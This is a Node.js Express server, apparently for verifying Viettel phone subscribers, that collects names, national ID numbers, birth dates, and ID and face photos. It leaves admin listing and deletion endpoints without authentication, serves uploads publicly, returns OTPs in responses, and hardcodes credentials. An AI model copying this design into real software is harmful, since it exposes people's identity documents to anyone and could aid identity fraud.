const express = require('express');
const session = require('express-session');
const multer = require('multer');
const bcrypt = require('bcryptjs');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
app.use('/uploads', express.static('uploads'));
app.use(session({
    secret: 'viettel_secret_key_2026',
    resave: false,
    saveUninitialized: true
}));

// Tạo thư mục cần thiết
if (!fs.existsSync('./uploads')) fs.mkdirSync('./uploads');
if (!fs.existsSync('./data')) fs.mkdirSync('./data');

// Đọc/Ghi file JSON
function readJSON(filename) {
    const filePath = `./data/${filename}.json`;
    if (!fs.existsSync(filePath)) return [];
    return JSON.parse(fs.readFileSync(filePath, 'utf8'));
}

function writeJSON(filename, data) {
    fs.writeFileSync(`./data/${filename}.json`, JSON.stringify(data, null, 2));
}

// Tạo tài khoản admin mặc định nếu chưa có
let admins = readJSON('admins');
if (admins.length === 0) {
    const hashedPassword = bcrypt.hashSync('admin123', 10);
    admins.push({ id: 1, username: 'admin', password: hashedPassword, fullname: 'Quản trị viên' });
    writeJSON('admins', admins);
}

// Cấu hình upload ảnh
const storage = multer.diskStorage({
    destination: './uploads/',
    filename: (req, file, cb) => {
        const uniqueName = Date.now() + '-' + Math.round(Math.random() * 1E9) + path.extname(file.originalname);
        cb(null, uniqueName);
    }
});
const upload = multer({ storage });

// Đầu số Viettel
const viettelPrefixes = ['086','096','097','098','099','032','033','034','035','036','037','038','039','056','058','070','076','081','082','083','084','085','088','089'];

function isViettelPhone(phone) {
    return phone && phone.length === 10 && viettelPrefixes.includes(phone.substring(0, 3));
}

// Ghi OTP vào file (chế độ test)
function sendOTP(phone, otp) {
    const log = `${new Date().toISOString()} - ${phone} - MÃ OTP: ${otp}\n`;
    fs.appendFileSync('./otp_test.txt', log);
    return { success: true, message: `Mã OTP: ${otp} (đã lưu file)` };
}

// ============ API ============

// Đăng ký xác thực
app.post('/api/submit', upload.fields([
    { name: 'cccd_front', maxCount: 1 },
    { name: 'cccd_back', maxCount: 1 },
    { name: 'face_photo', maxCount: 1 }
]), (req, res) => {
    const { phone, fullname, identity_number, dob } = req.body;
    
    if (!phone || !isViettelPhone(phone)) {
        return res.json({ success: false, message: 'Số điện thoại không hợp lệ hoặc không phải Viettel' });
    }
    if (!fullname) return res.json({ success: false, message: 'Vui lòng nhập họ tên' });
    if (!identity_number || identity_number.length !== 12) return res.json({ success: false, message: 'CCCD phải 12 số' });
    if (!dob) return res.json({ success: false, message: 'Vui lòng chọn ngày sinh' });
    
    const files = req.files;
    if (!files.cccd_front || !files.cccd_back || !files.face_photo) {
        return res.json({ success: false, message: 'Vui lòng upload đủ 3 ảnh' });
    }
    
    let subscribers = readJSON('subscribers');
    const existing = subscribers.find(s => s.phone === phone);
    if (existing && existing.status === 'verified') {
        return res.json({ success: false, message: 'Số điện thoại đã được xác thực trước đó' });
    }
    if (existing && existing.status === 'pending') {
        return res.json({ success: false, message: 'Số điện thoại đang chờ xác thực' });
    }
    
    const otp = Math.floor(100000 + Math.random() * 900000);
    const otpExpires = Date.now() + 5 * 60000;
    
    const newSubscriber = {
        id: Date.now(),
        phone,
        fullname,
        identity_number,
        dob,
        cccd_front: '/uploads/' + files.cccd_front[0].filename,
        cccd_back: '/uploads/' + files.cccd_back[0].filename,
        face_photo: '/uploads/' + files.face_photo[0].filename,
        otp_code: otp,
        otp_expires: otpExpires,
        status: 'pending',
        created_at: new Date().toISOString(),
        verified_at: null
    };
    
    subscribers.push(newSubscriber);
    writeJSON('subscribers', subscribers);
    
    const smsResult = sendOTP(phone, otp);
    req.session.verify_phone = phone;
    
    res.json({ success: true, message: 'Đã gửi mã xác thực. ' + smsResult.message, otp });
});

// Kiểm tra số điện thoại
app.post('/api/check-phone', (req, res) => {
    const { phone } = req.body;
    const subscribers = readJSON('subscribers');
    const existing = subscribers.find(s => s.phone === phone);
    
    if (existing) {
        res.json({ exists: true, status: existing.status, verified_at: existing.verified_at });
    } else {
        res.json({ exists: false });
    }
});

// Xác thực OTP
app.post('/api/verify', (req, res) => {
    const { phone, otp } = req.body;
    let subscribers = readJSON('subscribers');
    const index = subscribers.findIndex(s => s.phone === phone);
    
    if (index === -1) {
        return res.json({ success: false, message: 'Không tìm thấy số điện thoại' });
    }
    
    const sub = subscribers[index];
    if (sub.otp_expires < Date.now()) {
        return res.json({ success: false, message: 'Mã OTP đã hết hạn' });
    }
    if (parseInt(otp) !== sub.otp_code) {
        return res.json({ success: false, message: 'Mã OTP không chính xác' });
    }
    
    subscribers[index].status = 'verified';
    subscribers[index].verified_at = new Date().toISOString();
    writeJSON('subscribers', subscribers);
    
    res.json({ success: true, message: 'Xác thực thành công!' });
});

// Gửi lại OTP
app.post('/api/resend-otp', (req, res) => {
    const { phone } = req.body;
    let subscribers = readJSON('subscribers');
    const index = subscribers.findIndex(s => s.phone === phone);
    
    if (index === -1) {
        return res.json({ success: false, message: 'Không tìm thấy số điện thoại' });
    }
    
    const otp = Math.floor(100000 + Math.random() * 900000);
    const otpExpires = Date.now() + 5 * 60000;
    
    subscribers[index].otp_code = otp;
    subscribers[index].otp_expires = otpExpires;
    writeJSON('subscribers', subscribers);
    
    const result = sendOTP(phone, otp);
    res.json({ success: true, message: result.message, otp });
});

// Lấy danh sách thuê bao (admin)
app.get('/api/subscribers', (req, res) => {
    const subscribers = readJSON('subscribers');
    res.json(subscribers);
});

// Xóa thuê bao (admin)
app.delete('/api/subscribers/:id', (req, res) => {
    let subscribers = readJSON('subscribers');
    subscribers = subscribers.filter(s => s.id != req.params.id);
    writeJSON('subscribers', subscribers);
    res.json({ success: true });
});

// Đăng nhập admin
app.post('/api/admin-login', (req, res) => {
    const { username, password } = req.body;
    const admins = readJSON('admins');
    const admin = admins.find(a => a.username === username);
    
    if (admin && bcrypt.compareSync(password, admin.password)) {
        req.session.admin = true;
        req.session.adminName = admin.fullname;
        res.json({ success: true });
    } else {
        res.json({ success: false, message: 'Sai tên đăng nhập hoặc mật khẩu' });
    }
});

// Đăng xuất admin
app.post('/api/admin-logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

// Kiểm tra session admin
app.get('/api/admin-check', (req, res) => {
    res.json({ loggedIn: !!req.session.admin, name: req.session.adminName || '' });
});

app.listen(PORT, () => {
    console.log(`🚀 Server chạy tại http://localhost:${PORT}`);
    console.log(`👤 Admin: admin / admin123`);
});